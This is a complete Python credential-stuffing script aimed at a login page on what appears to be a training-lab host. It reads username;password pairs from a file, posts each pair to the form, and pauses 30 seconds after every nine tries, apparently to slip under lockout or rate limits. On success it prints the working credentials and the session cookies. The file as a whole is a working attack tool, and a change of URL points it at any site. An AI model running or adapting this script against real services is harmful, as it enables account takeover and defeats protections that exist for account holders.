import requests
import time

URL = "http://xebec.cylabacademy.net:21123/login"
CREDS_FILE = "creds.txt"
BATCH_SIZE = 9
COOLDOWN = 30

def try_login(session, username, password):
    resp = session.post(URL, data={
        "username": username,
        "password": password
    }, timeout=5)
    return resp

def main():
    with open(CREDS_FILE, "r") as f:
        pairs = []
        for line in f:
            line = line.strip()
            if line and ";" in line:
                u, p = line.split(";", 1)
                pairs.append((u, p))

    print(f"[*] Loaded {len(pairs)} pairs")

    session = requests.Session()
    attempt_count = 0

    for i, (username, password) in enumerate(pairs):
        resp = try_login(session, username, password)

        # Adjust this check based on actual failure/success response
        if "Invalid" in resp.text or resp.status_code in (401, 403):
            print(f"[-] ({i+1}/{len(pairs)}) Failed: {username}:{password}")
        else:
            print(f"[+] SUCCESS: {username}:{password}")
            print(resp.status_code, resp.text[:500])
            print("Cookies:", session.cookies.get_dict())
            break

        attempt_count += 1

        if attempt_count >= BATCH_SIZE:
            print(f"[*] Hit {BATCH_SIZE} attempts, cooling down {COOLDOWN}s...")
            time.sleep(COOLDOWN)
            attempt_count = 0

if __name__ == "__main__":
    main()
